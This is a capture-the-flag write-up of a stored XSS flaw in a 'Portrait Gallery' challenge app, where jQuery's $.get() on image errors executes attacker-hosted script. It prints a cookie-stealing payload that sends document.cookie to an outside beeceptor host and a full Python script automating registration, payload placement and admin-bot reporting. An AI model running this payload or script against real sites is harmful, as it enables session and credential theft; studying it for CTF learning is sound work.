

# Portrait Gallery XSS Vulnerability Writeup

## Vulnerability Overview

The Portrait Gallery application contains a stored XSS vulnerability that allows attackers to steal the admin bot's cookie containing the flag.

## Application Architecture

The application consists of:
1. A web frontend that allows users to register, add portraits, and view galleries
2. An admin bot that visits reported URLs with a flag cookie
3. A MongoDB backend for data storage

## Vulnerability Details

The critical vulnerability exists in the gallery.html file, specifically in the image error handling mechanism:

```javascript
img.on("error", (e) => {
    $.get(e.currentTarget.src).fail((response) => {
        if (response.status === 403) {
            $(e.target).attr("src", "https://cdn.pixabay.com/photo/2021/08/03/06/14/lock-6518557_1280.png");
        } else {
            $(e.target).attr(
                "src",
                "https://cdn.pixabay.com/photo/2024/02/12/16/05/siguniang-mountain-8568913_1280.jpg"
            );
        }
    });
});
```

When an image fails to load, The web-app makes another `$.get()` request to the same URL which creates a situation where jQuery can execute the URL Contents.


## Exploit Chain

1. First, create a portrait with a malicious JavaScript file URL as the source:
   ```
   https://ddddd.free.beeceptor.com/exploit.js
   ```

The exploit.js file contains:
   ```javascript
   document.location='https://ddddd.free.beeceptor.com/steal?c='+document.cookie;
   ```

2. Report the page to the admin bot. When the admin bot visits the gallery page:
   - The browser tries to load exploit.js as an image, which fails
   - The error then makes a jQuery $.get() request to exploit.js
   - jQuery parses the JavaScript content which then executes the malicious code
   - The code redirects the admin bot to the server with the flag cookie

## Root Cause Analysis

1. **Input validation**: The application allows any URL as an image source without verifying it's actually an image,
2. **jQuery's behavior**: jQuery's $.get() can execute JavaScript in certain contexts
3. **Non-Http Only cookies**: The flag cookie is accessible from JavaScript

## Automation Code
```py 
beeceptorendpoint = "dddd"
# Make sure to change the baseurl to your own instance.
baseurl = "52.188.82.43:8070"
print("Web/Portrait Exploit")
input(f"Before you run this script, please go to https://app.beeceptor.com/console/{beeceptorendpoint} to catch the requests to your endpoint.")

import requests
import random
import string

url = f"http://{baseurl}/api/register"
username = "hackingtime" + ''.join(random.choices(string.ascii_letters + string.digits, k=5))
data = {
    "username": username,
    "password": "timetohack1"
}
print("Registering...")
response = requests.post(url, json=data)
if response.status_code == 200:
    print("Register Success")
    token = response.json()["token"]
else:
    print("Register Failed")
    print(response.text)
    exit()
print("Placing Exploit...")
data = {
    "name": "hacked",
    "source": f"https://{beeceptorendpoint}.free.beeceptor.com/exploit.js"
}
headers = {
    "Content-Type": "application/json",
    "Authorization": f"Bearer {token}",
}
response = requests.post(f"http://{baseurl}/api/portraits", json=data, headers=headers)
if response.status_code == 200 and "saved" in response.text:
    print("Exploit Placed")
else:
    print("Exploit Placement Failed")
    print(response.text)
    exit()
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Sec-GPC": "1",
    "Priority": "u=0",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache"
}
print("Running Exploit...")
data = {
    "url": f"http://{baseurl}/gallery?username={username}"
}
response = requests.post(f"http://{baseurl}/report/", data=data, headers=headers)
if response.status_code == 200 and "visited" in response.text:
    print("Exploit Success! Check your Beeceptor URL for the flag.")
else:
    print("Exploit Failed")
    print(response.text)
    exit()
```
